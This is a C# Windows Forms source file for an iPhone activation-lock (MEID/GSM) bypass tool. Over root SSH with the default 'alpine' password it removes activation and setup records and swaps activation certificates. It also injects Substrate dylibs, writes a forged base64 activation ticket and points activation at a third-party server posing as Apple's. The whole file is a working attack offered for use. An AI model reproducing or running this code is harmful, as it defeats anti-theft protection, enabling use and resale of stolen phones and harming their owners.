// By: Brayan Villa Project 2021 //
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net;
using Renci.SshNet;
using System.Diagnostics;

namespace NameOfYouProject
{
    public partial class Form1 : Form
    {
        public SshClient sh = new SshClient("127.0.0.1", "root", "alpine");
        public ScpClient pc = new ScpClient("127.0.0.1", "root", "alpine");
        public Process proc = new Process();
        public Form1()
        {
            InitializeComponent();
        }
        public bool Proxy()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\iproxy.exe",
                        Arguments = "22 44",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true,
                    }
                };
                proc.Start();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool Desactivate()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\ideviceactivation.exe",
                        Arguments = "deactivate",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true,
                    }
                };
                proc.Start();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool HacktivateMEIDevice()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\ideviceactivation.exe",
                        Arguments = "activate -d -s https://ex3cution3ractivation.000webhostapp.com/v32.php",
                        UseShellExecute = false,
                        RedirectStandardInput = true,
                        CreateNoWindow = true,
                    }
                };
                proc.Start();
                proc.WaitForExit();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool HacktivateGSMDevice()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\ideviceactivation.exe",
                        Arguments = "activate -d -s https://ex3cution3ractivation.000webhostapp.com/Activation.php",
                        UseShellExecute = false,
                        RedirectStandardInput = true,
                        CreateNoWindow = true,
                    }
                };
                proc.Start();
                proc.WaitForExit();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }		
        public bool Paired()
        {
            try
            {
                proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ".\\LibimobiledeviceEXE\\idevicepair.exe",
                        Arguments = "pair",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                StreamReader reader = proc.StandardOutput;
                string result = reader.ReadToEnd();
                try
                {
                    proc.Kill();
                }
                catch
                {

                }
                if (result.Contains("SUCCESS"))
                {
                    reader.Dispose();
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                MessageBox.Show("idevicepair not found");
                return false;
            }
        }
        public bool Method_1()
        {
            bool rv = sh.IsConnected;
            bool vr = pc.IsConnected;
            try
            {
                string Known = "%USERPATH%\\.ssh\\known_hosts";
                Proxy();
                if (File.Exists(Known))
                {
                    File.Delete(Known);
                }
                if (!rv)
                {
                    sh.Connect();
                }
                if (!vr)
                {
                    pc.Connect();
                }
                sh.CreateCommand("mount -o rw,union,update /").Execute();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool Method_2()
        {
            try
            {
                if (Paired() != true)
                {
                    MessageBox.Show("Unlock your iDevice and Press the Trust button\n\nDesbloquea tu iDevice y preciona el botón Confiar", "IMPORTANT");
                    Paired();
                }
                Desactivate();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool Method_3()
        {
            try
            {
                sh.CreateCommand("chflags -R nouchg /private/var/mobile/Library/Preferences").Execute();
                sh.CreateCommand("chflags -R nouchg /private/var/wireless/Library/Preferences").Execute();
                sh.CreateCommand("chflags -R nouchg /private/var/containers/Data/System/*/Library/internal/../*").Execute();
                sh.CreateCommand("chflags -R nouchg /private/var/root/Library/Lockdown").Execute();
                sh.CreateCommand("rm /private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist").Execute();
                sh.CreateCommand("rm /private/var/mobile/Library/Preferences/com.apple.purplebuddy.notbackedup.plist").Execute();
                sh.CreateCommand("rm -rf /private/var/containers/Data/System/*/Library/internal/../*").Execute();
                sh.CreateCommand("plutil -kPostponementTicket -remove /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("cp /private/preboot/active /./; key=$(cat /./active); mount -o rw,union,update /private/preboot; mv /private/preboot/$key/usr/local/standalone/firmware/Baseband2 /private/preboot/$key/usr/local/standalone/firmware/Baseband; rm /./active").Execute();
                sh.CreateCommand("cd /System/Library && launchctl unload -w -F LaunchDaemons*").Execute();
                sh.CreateCommand("cd /System/Library && launchctl load -w -F LaunchDaemons*").Execute();
                Thread.Sleep(5000);
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool Method_4()
        {
            try
            {
                pc.Upload(new FileInfo(".\\Deb\\CydiaSubstrate\\Substrate.tar.lzma"), "/./c.tar.lzma");
                pc.Upload(new FileInfo(".\\Deb\\Binaries\\MyUtils"), "/./MyUtils");
                sh.CreateCommand("tar -xvf /./MyUtils -C /./").Execute();
                sh.CreateCommand("rm /./MyUtils").Execute();
                sh.CreateCommand("chmod -R 00755 /bin /sbin /usr/bin /usr/sbin").Execute();
                sh.CreateCommand("lzma -d -v /./c.tar.lzma").Execute();
                sh.CreateCommand("tar -xvf /./c.tar -C /./").Execute();
                sh.CreateCommand("rm /./c.tar").Execute();
                sh.CreateCommand("chmod -R 00777 /usr/lib /bin /usr/libexec").Execute();
                sh.CreateCommand("/usr/libexec/substrate").Execute();
                sh.CreateCommand("/usr/libexec/substrated").Execute();
                sh.CreateCommand("key=$(uicache --respring && killall backboardd); if test -z $key; then killall HUD SpringBoard; else echo ''; fi ").Execute();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }

        }
        public bool Method_5()
        {
            try
            {
                sh.CreateCommand("cp -rp /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/FactoryActivation.pem /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem").Execute();
                sh.CreateCommand("cd /System/Library; launchctl unload LaunchDaemons/com.apple.mobileactivationd.plist").Execute();
                sh.CreateCommand("cd /System/Library; launchctl unload LaunchDaemons/com.apple.mobile.lockdown.plist").Execute();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public void Snappy()
        {
            sh.CreateCommand("snappy -f / -r `snappy -f / -l | sed -n 2p` -t orig-fs").Execute();
        }

        public bool Method_6()
        {
            try
            {
                Snappy();
                pc.Upload(new FileInfo(".\\Deb\\Dylibs\\untethered.dylib"), "/./Library/MobileSubstrate/DynamicLibraries/untethered.dylib");
                pc.Upload(new FileInfo(".\\Deb\\Dylibs\\untethered.plist"), "/./Library/MobileSubstrate/DynamicLibraries/untethered.plist");
                sh.CreateCommand("chmod 00777 /./Library/MobileSubstrate/DynamicLibraries/untethered.dylib").Execute();
                sh.CreateCommand("cd /System/Library; launchctl load LaunchDaemons/com.apple.mobileactivationd.plist").Execute();
                sh.CreateCommand("cd /System/Library; launchctl load LaunchDaemons/com.apple.mobile.lockdown.plist").Execute();
                sh.CreateCommand("killall -9 SpringBoard mobileactivationd").Execute();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool Method_7MEID()
        {
            Thread.Sleep(10000);
            try
            {
                if (Paired() != true)
                {
                    MessageBox.Show("Unlock your iDevice and Press the Trust button\n\nDesbloquea tu iDevice y preciona el botón Confiar", "IMPORTANT");
                    Paired();
                }
                HacktivateMEIDevice();
                HacktivateMEIDevice();
                Thread.Sleep(3000);
                sh.CreateCommand("chflags -R uchg /private/var/containers/Data/System/*/Library/internal/../*").Execute();
                sh.CreateCommand("cd /System/Library; launchctl unload LaunchDaemons/*CommCenter*").Execute();
                sh.CreateCommand("cd /System/Library; launchctl unload LaunchDaemons/*mobileac*").Execute();
                sh.CreateCommand("plutil -AccountToken /private/var/containers/Data/System/*/Library/internal/../activation_records/activation_record.plist &>/Token").Execute();
                sh.CreateCommand("base64 -d -i /Token &>/TokenD").Execute();
                sh.CreateCommand("key=$(plutil -WildcardTicket /TokenD); plutil -dict -kPostponementTicket /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("key=$(plutil -WildcardTicket /TokenD); plutil -kPostponementTicket -ActivationState -string Activated /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("key=$(plutil -WildcardTicket /TokenD); plutil -kPostponementTicket -PhoneNumberNotificationURL -string https://albert.apple.com/deviceservices/phoneHome /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("key=$(plutil -WildcardTicket /TokenD); plutil -kPostponementTicket -ActivityURL -string https://albert.apple.com/deviceservices/activity /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("key=$(plutil -WildcardTicket /TokenD); plutil -kPostponementTicket -ActivationTicket -string $key /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
                return false;
            }
        }
        public bool Method_8()
        {
            string Buddy = "/./private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist";
            string Ticket = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KCTxrZXk+QWN0aXZhdGlvblJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkFjdGl2YXRpb25SYW5kb21uZXNzPC9rZXk+CgkJPHN0cmluZz4zMGI2MGZkMC02Njc0LTQ3NzgtYmIxNC1mNGZhOTQ0MWQ0Yzg8L3N0cmluZz4KCQk8a2V5PkFjdGl2YXRpb25TdGF0ZTwva2V5PgoJCTxzdHJpbmc+VW5hY3RpdmF0ZWQ8L3N0cmluZz4KCQk8a2V5PkZNaVBBY2NvdW50RXhpc3RzPC9rZXk+CgkJPHRydWUvPgoJPC9kaWN0PgoJPGtleT5CYXNlYmFuZFJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkFjdGl2YXRpb25SZXF1aXJlc0FjdGl2YXRpb25UaWNrZXQ8L2tleT4KCQk8dHJ1ZS8+CgkJPGtleT5CYXNlYmFuZEFjdGl2YXRpb25UaWNrZXRWZXJzaW9uPC9rZXk+CgkJPHN0cmluZz5WMjwvc3RyaW5nPgoJCTxrZXk+QmFzZWJhbmRDaGlwSUQ8L2tleT4KCQk8aW50ZWdlcj4xMjM0NTY3PC9pbnRlZ2VyPgoJCTxrZXk+QmFzZWJhbmRNYXN0ZXJLZXlIYXNoPC9rZXk+CgkJPHN0cmluZz44Q0IxMDcwRDk1QjlDRUU0QzgwMDAwNUUyMTk5QkI4RkIxODNCMDI3MTNBNTJEQjVFNzVDQTJBNjE1NTM2MTgyPC9zdHJpbmc+CgkJPGtleT5CYXNlYmFuZFNlcmlhbE51bWJlcjwva2V5PgoJCTxkYXRhPgoJCUVnaGRDdz09CgkJPC9kYXRhPgoJCTxrZXk+SW50ZXJuYXRpb25hbE1vYmlsZUVxdWlwbWVudElkZW50aXR5PC9rZXk+CgkJPHN0cmluZz4xMjM0NTY3ODkxMjM0NTY8L3N0cmluZz4KCQk8a2V5Pk1vYmlsZUVxdWlwbWVudElkZW50aWZpZXI8L2tleT4KCQk8c3RyaW5nPjEyMzQ1Njc4OTEyMzQ1PC9zdHJpbmc+CgkJPGtleT5TSU1TdGF0dXM8L2tleT4KCQk8c3RyaW5nPmtDVFNJTVN1cHBvcnRTSU1TdGF0dXNOb3RJbnNlcnRlZDwvc3RyaW5nPgoJCTxrZXk+U3VwcG9ydHNQb3N0cG9uZW1lbnQ8L2tleT4KCQk8dHJ1ZS8+CgkJPGtleT5rQ1RQb3N0cG9uZW1lbnRJbmZvUFJMTmFtZTwva2V5PgoJCTxpbnRlZ2VyPjA8L2ludGVnZXI+CgkJPGtleT5rQ1RQb3N0cG9uZW1lbnRJbmZvU2VydmljZVByb3Zpc2lvbmluZ1N0YXRlPC9rZXk+CgkJPGZhbHNlLz4KCTwvZGljdD4KCTxrZXk+RGV2aWNlQ2VydFJlcXVlc3Q8L2tleT4KCTxkYXRhPgoJTFMwdExTMUNSVWRKVGlCRFJWSlVTVVpKUTBGVVJTQlNSVkZWUlZOVUxTMHRMUzBLVFVsSlFuaEVRME5CVXpCRFFWRkIKCWQyZFpUWGhNVkVGeVFtZE9Wa0pCVFZSS1JVa3pUbXRSTUU1RlJUVk1WVmt6VGpCUmRFNUZVVEJOYVRBMFVWVktRZzBLCglURlJyZUZKcVdrVlNSRWw1VWtWS1IwNXFSVXhOUVd0SFFURlZSVUpvVFVOV1ZrMTRRM3BCU2tKblRsWkNRV2RVUVd0TwoJYWpaeFNVbHRUbmxXU21WMU5sTTJVak40UVcxT1RXNWFjREpHTDNoRVNIRjViVmxVT1ZoT1JFdzBjRlJaYjFnMmF6QmsKCVFrMVNTWGRGUVZsRVZsRlJTQTBLUlhkc1JHUllRbXhqYmxKd1ltMDRlRVY2UVZKQ1owNVdRa0Z2VkVOclJuZGpSM2hzCglTVVZzZFZsNU5IaEVla0ZPUW1kT1ZrSkJjMVJDYld4UllVYzVkUTBLV2xSRFFtNTZRVTVDWjJ0eGFHdHBSemwzTUVKQgoJUVUxQk1FZERVM0ZIVTBsaU0wUlJSVUpDVVZWQlFUUkhRa0ZETDJ4eWJHVlJUamR3UVEwS00yaEhWVlkwU0ZsU1lXdHYKCWFrazRPV3d4YUZKdmRqQlROREJPTUhBeU1UaHJUV295YkRGT2EzUXdWWEJxV2s5RU5WVldlVGRDT0VsT1FrSm1RMmxNCglNZzBLWnk4dkx5dHpaVVZoVjFjMGFEWXdUM0pOZG5KbFFWQTBNR0psVTJaUFlucE1WR3hYUzJGV2NXRnJNV1JGVGpSSgoJTkd4TVRYaHBlVFVyYjNwSVpqWmlWdzBLVGl0bldFSlVNMjl4WkhWRFF6RldWelZKV25aMlpFUlNWRWx3YUZoNmEyRUsKCVVVVkdRVUZQUW1wUlFYZG5XV3REWjFsRlFYSlVhMVpFZDBGV01IbHRZazVWUm14ME0yeExjMHRCWkEwS2JuYzBTRlpPCglaMEZ1UkhoaWRRMEtRVUpXV1VSMlNGaEJNREZNV0ZOS1F5dHRkamd5VFZSSWQySk5ORVF2V2xJclJFaFpRV1kyWXlzNQoJYVc1TlJtUk9PR2xaV0hSSWFFOXdjV3MwYVd4TlR3MEtZMnRuWWtsNlMwb3lOWFJPWTFKVWMwOXdWVU5CZDBWQlFXRkIKCUxTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVWdVa1ZSVlVWVFZDMHRMUzB0Cgk8L2RhdGE+Cgk8a2V5PkRldmljZUlEPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PlNlcmlhbE51bWJlcjwva2V5PgoJCTxzdHJpbmc+RlIxUDJHSDhKOFhIPC9zdHJpbmc+CgkJPGtleT5VbmlxdWVEZXZpY2VJRDwva2V5PgoJCTxzdHJpbmc+ZDk4OTIwOTZjZjM0MTFlYTg3ZDAwMjQyYWMxMzAwMDNmMzQxMWU0Mjwvc3RyaW5nPgoJPC9kaWN0PgoJPGtleT5EZXZpY2VJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkJ1aWxkVmVyc2lvbjwva2V5PgoJCTxzdHJpbmc+MThGMDA8L3N0cmluZz4KCQk8a2V5PkRldmljZUNsYXNzPC9rZXk+CgkJPHN0cmluZz5pUGhvbmU8L3N0cmluZz4KCQk8a2V5PkRldmljZVZhcmlhbnQ8L2tleT4KCQk8c3RyaW5nPkI8L3N0cmluZz4KCQk8a2V5Pk1vZGVsTnVtYmVyPC9rZXk+CgkJPHN0cmluZz5NTExOMjwvc3RyaW5nPgoJCTxrZXk+T1NUeXBlPC9rZXk+CgkJPHN0cmluZz5pUGhvbmUgT1M8L3N0cmluZz4KCQk8a2V5PlByb2R1Y3RUeXBlPC9rZXk+CgkJPHN0cmluZz5pUGhvbmUwLDA8L3N0cmluZz4KCQk8a2V5PlByb2R1Y3RWZXJzaW9uPC9rZXk+CgkJPHN0cmluZz4xNC4wLjA8L3N0cmluZz4KCQk8a2V5PlJlZ2lvbkNvZGU8L2tleT4KCQk8c3RyaW5nPkxMPC9zdHJpbmc+CgkJPGtleT5SZWdpb25JbmZvPC9rZXk+CgkJPHN0cmluZz5MTC9BPC9zdHJpbmc+CgkJPGtleT5SZWd1bGF0b3J5TW9kZWxOdW1iZXI8L2tleT4KCQk8c3RyaW5nPkExMjM0PC9zdHJpbmc+CgkJPGtleT5TaWduaW5nRnVzZTwva2V5PgoJCTx0cnVlLz4KCQk8a2V5PlVuaXF1ZUNoaXBJRDwva2V5PgoJCTxpbnRlZ2VyPjEyMzQ1Njc4OTEyMzQ8L2ludGVnZXI+Cgk8L2RpY3Q+Cgk8a2V5PlJlZ3VsYXRvcnlJbWFnZXM8L2tleT4KCTxkaWN0PgoJCTxrZXk+RGV2aWNlVmFyaWFudDwva2V5PgoJCTxzdHJpbmc+Qjwvc3RyaW5nPgoJPC9kaWN0PgoJPGtleT5Tb2Z0d2FyZVVwZGF0ZVJlcXVlc3RJbmZvPC9rZXk+Cgk8ZGljdD4KCQk8a2V5PkVuYWJsZWQ8L2tleT4KCQk8dHJ1ZS8+Cgk8L2RpY3Q+Cgk8a2V5PlVJS0NlcnRpZmljYXRpb248L2tleT4KCTxkaWN0PgoJCTxrZXk+Qmx1ZXRvb3RoQWRkcmVzczwva2V5PgoJCTxzdHJpbmc+ZmY6ZmY6ZmY6ZmY6ZmY6ZmY8L3N0cmluZz4KCQk8a2V5PkJvYXJkSWQ8L2tleT4KCQk8aW50ZWdlcj4yPC9pbnRlZ2VyPgoJCTxrZXk+Q2hpcElEPC9rZXk+CgkJPGludGVnZXI+MzI3Njg8L2ludGVnZXI+CgkJPGtleT5FdGhlcm5ldE1hY0FkZHJlc3M8L2tleT4KCQk8c3RyaW5nPmZmOmZmOmZmOmZmOmZmOmZmPC9zdHJpbmc+CgkJPGtleT5VSUtDZXJ0aWZpY2F0aW9uPC9rZXk+CgkJPGRhdGE+CgkJTUlJRDB3SUJBakNDQTh3RUlQNEMzc3FRdFAxUzJod0JaekNvSGNzb0gyeE51NWMrYTRRNDVvSjFNS0YzCgkJQkVFRTJlOTNlb1ZPeHVmMGVLUFVxTkVnNnpNbEJzTnEranIrUnFNQXhTaFZBL2NUNW9ua3IwdCtFMEhLCgkJblNkdkhNMi9GZXRyT3FpT0k0RHZIUElEVzBEMnVBUVEzaW9iUHdhQWxGbFhIUFdyOE1KLyt3UVFHVGxuCgkJRVhPMTZOdDJrVUUrdy8vQmxHd1Q4V3hSZXkvSU41SW1NbGtZelpsSnpack83dVl0bHBlZ3k2K3hJaWwyCgkJQjJYbHk0aUd4UlppUld5NXNLcFFvMll6b0pFbW1XU25manUwY1UyL3JiOUZCdnVWaS9rV1NGbkFrdDR5CgkJcVF3NGswaWJ0cDVXK1lVQ0NvZm8zeWVuak0yVWMwbit5SExyU20wRTlPUDNwdExUN3ZHcnJma3IzWFJpCgkJdHdEcGRCT3NzK1h6SEFRWEt1cG85WGkxUW1ObGp1VGoxakpZbzZNc1kyOURYOUVacFdEdmpJc0l5THd4CgkJQjRjbUlTVWY4Qm5yUlFHOURBM01lYzZiaFRkUEJjdUtXZHBCbm5DMlY4V3BmTXBwVUQ2U2RndW5pejZ6CgkJTEcwNmNGR3dvUXZuWXhRa1Vra2pkWWR6NG85eXM5L3ZxQ2JxZnBuNHRjZEkyMWM5Z29Nd0xoRHNoYms1CgkJUENaQnNoNUY0U1JSaWdBV3JBU0NBejk4MkI3bzhwQ0NaL2pZK3laQ3pBb3J6SG5zR2Z2d0tpSlBBTWppCgkJZTA0RzRqSk04cEpRUU5uWmFhUCt0RmVsZGhER1FubzA0dmZKRFkzOEZGTSthZUN3elJyQy9DUGJrZVpRCgkJNXR5NTdMSXNzMUhyUmUzSTFjK0ZMNXBuZmwvaEsxQjF1QTRHRDRWbFkxU0xMMXk1ajRHdUZUM1hTeHpiCgkJWlIvZmJEa1V5VHNUM3I2eGdoWnRNNEJYSW9hNjJaREMzSVBtT2J4S2JobGFLQTRtSzJzM1FCNFZjNlMvCgkJbTZ1YTZQakwvQjE1QzBjTGpyMUNNb0x0Lzc4TFVRV21GRXV5SkhkdnRTNnhIbWtMRG9FZW1tMHlDcGJqCgkJMmhrRmt2d3dISlg2SDFiUm1KWS9HUmY1UXVIWDVKdlk3ZGhOY2YzNENmaVExRHdwZ2VKUkw5eTN2SG0vCgkJZkFSV0JxWDNkWjV1VUpXcUNzMklvMFdIRGdqMTh3cW5vUEw2QnRHcjVhWEJFeGF3WkpGT1ZOcVZjV2lPCgkJOE9LMzhuSDFKaGcxVk44UURBelhmTEpjQ2w0UEN6Mm5sVlpSMDl1WnF0NlpPaXFjVUNyZ3hZbTdIQktaCgkJOS9BRmIyVmxLUFRZTTNueXBDeGh5MmNMQnowK3RCK0V6V0hTbjlzU3FMelN1eFBOdGIxY21FMno5OFNoCgkJMk1UVzJaWk42NWdvYkxrSU5wbzdUb1RBMm50cHY1ZjBqdlhpVnZIV1V1dmhUSVlLZG4vKzA0czNJQ0VLCgkJQVlJQ0NPNjgvakxucDVQUERuRmVsQ3Z1d0dFRTFkb0lMNzZ6UllNOWlrWTJHRVB5NW5XdW1ydXp4U2RCCgkJMURBNnNOeUxQanN2QnBnYUVnWmI0OUpXSjlERU5vYWZKeGQ4dlBoRnpORHZEL0NRKzU4VGtCYmYwWEVLCgkJa2xIRzdzOFY0SkRsYS9jMTBjSDcyWS8wL0lOUi9kUVk1V3FSaHNiSEVFalBVekdDTGNVPQoJCTwvZGF0YT4KCQk8a2V5PldpZmlBZGRyZXNzPC9rZXk+CgkJPHN0cmluZz5mZjpmZjpmZjpmZjpmZjpmZjwvc3RyaW5nPgoJPC9kaWN0Pgo8L2RpY3Q+CjwvcGxpc3Q+";
            try
            {
                sh.CreateCommand("rm /./Library/MobileSubstrate/DynamicLibraries/*").Execute();
                pc.Upload(new FileInfo(".\\Deb\\Dylibs\\af2ccdService.dylib"), "/./Library/MobileSubstrate/DynamicLibraries/af2ccdService.dylib");
                pc.Upload(new FileInfo(".\\Deb\\Dylibs\\af2ccdService.plist"), "/./Library/MobileSubstrate/DynamicLibraries/af2ccdService.plist");
                sh.CreateCommand("chmod 00777 /./Library/MobileSubstrate/DynamicLibraries/af2ccdService.dylib").Execute();
                sh.CreateCommand("echo \"<plist version=\"1.0\"><dict><key>SetupVersion</key><integer>11</integer><key>UserChoseLanguage</key><true/><key>PBDiagnostics4Presented</key><true/><key>PrivacyPresented</key><true/><key>WebKitAcceleratedDrawingEnabled</key><false/><key>PaymentMiniBuddy4Ran</key><true/><key>RestoreChoice</key><true/><key>Mesa2Presented</key><true/><key>GuessedCountry</key><dict><key>countries</key><array><string>CA</string></array><key>at</key><date>2019-11-18T20:06:16Z</date></dict><key>Locale</key><string>en_CA</string><key>setupMigratorVersion</key><integer>10</integer><key>WebKitShrinksStandaloneImagesToFit</key><true/><key>SetupFinishedAllSteps</key><true/><key>HSA2UpgradeMiniBuddy3Ran</key><true/><key>lastPrepareLaunchSentinel</key><array><date>2019-11-20T00:05:01Z</date><integer>0</integer></array><key>AppleIDPB10Presented</key><true/><key>PrivacyContentVersion</key><integer>2</integer><key>UserInterfaceStyleModePresented</key><true/><key>Language</key><string>en-CA</string><key>SetupLastExit</key><date>2019-11-18T20:08:55Z</date><key>chronicle</key><dict><key>features</key><array></array></dict><key>SiriOnBoardingPresented</key><true/><key>AssistantPresented</key><true/><key>WebDatabaseDirectory</key><string>/var/mobile/Library/Caches</string><key>WebKitOfflineWebApplicationCacheEnabled</key><true/><key>SetupState</key><string>SetupUsingAssistant</string><key>AutoUpdatePresented</key><true/><key>ScreenTimePresented</key><true/><key>Passcode4Presented</key><true/><key>SetupDone</key><true/><key>WebKitLocalStorageDatabasePathPreferenceKey</key><string>/var/mobile/Library/Caches</string></dict></plist>\" &>/./private/var/mobile/Library/Preferences/com.apple.purplebuddy.plist").Execute();
                sh.CreateCommand("plutil -binary " + Buddy + "").Execute();
                sh.CreateCommand("chown mobile " + Buddy + "").Execute();
                sh.CreateCommand("chmod 00600 " + Buddy + "").Execute();
                sh.CreateCommand("chflags uchg " + Buddy + "").Execute();
                sh.CreateCommand("cd /System/Library; launchctl load LaunchDaemons/*CommCenter*").Execute();
                Thread.Sleep(5000);
                sh.CreateCommand("chflags nouchg /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("plutil -backup /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("plutil -kPostponementTicket -remove /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("plutil -dict -kPostponementTicket /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("plutil -kPostponementTicket -ActivationState -string Activated /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("plutil -kPostponementTicket -ActivityURL -string https://albert.apple.com/deviceservices/activity /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("plutil -kPostponementTicket -PhoneNumberNotificationURL -string https://albert.apple.com/deviceservices/phoneHome /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("plutil -kPostponementTicket -ActivationTicket -string " + Ticket + " /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("chflags uchg /private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist").Execute();
                sh.CreateCommand("cd /System/Library; launchctl load LaunchDaemons/*mobileac*").Execute();
                return true;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");

                return false;
            }

        }
		// BYPASS MEID CODE EXAMPLE //
        public void Bypass()
        {
            try
            {
                if(Method_1() != false)
                {
                    try
                    {
                        if(Method_2() != false)
                        {
                            try
                            {
                                if(Method_3() != false)
                                {
                                    try
                                    {
                                        if(Method_4() != false)
                                        {
                                            try
                                            {
                                                if(Method_5() != false)
                                                {
                                                    try
                                                    {
                                                        if(Method_6() != false)
                                                        {
                                                            try
                                                            {
                                                                if(Method_7MEID() != false)
                                                                {
                                                                    try
                                                                    {
                                                                        if(Method_8() != false)
                                                                        {
                                                                            MessageBox.Show("¡Successfully Activated!", "MESSAGE");
                                                                        }
                                                                    }
                                                                    catch (Exception e)
                                                                    {
                                                                        MessageBox.Show(e.Message, "ERROR");
                                                                    }
                                                                }
                                                            }
                                                            catch (Exception e)
                                                            {
                                                                MessageBox.Show(e.Message, "ERROR");
                                                            }
                                                        }
                                                    }
                                                    catch (Exception e)
                                                    {
                                                        MessageBox.Show(e.Message, "ERROR");
                                                    }
                                                }
                                            }
                                            catch (Exception e)
                                            {
                                                MessageBox.Show(e.Message, "ERROR");
                                            }

                                        }
                                    }
                                    catch (Exception e)
                                    {
                                        MessageBox.Show(e.Message, "ERROR");
                                    }
                                }
                            }
                            catch (Exception e)
                            {
                                MessageBox.Show(e.Message, "ERROR");
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        MessageBox.Show(e.Message, "ERROR");
                    }
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "ERROR");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Bypass();
        }
    }
}
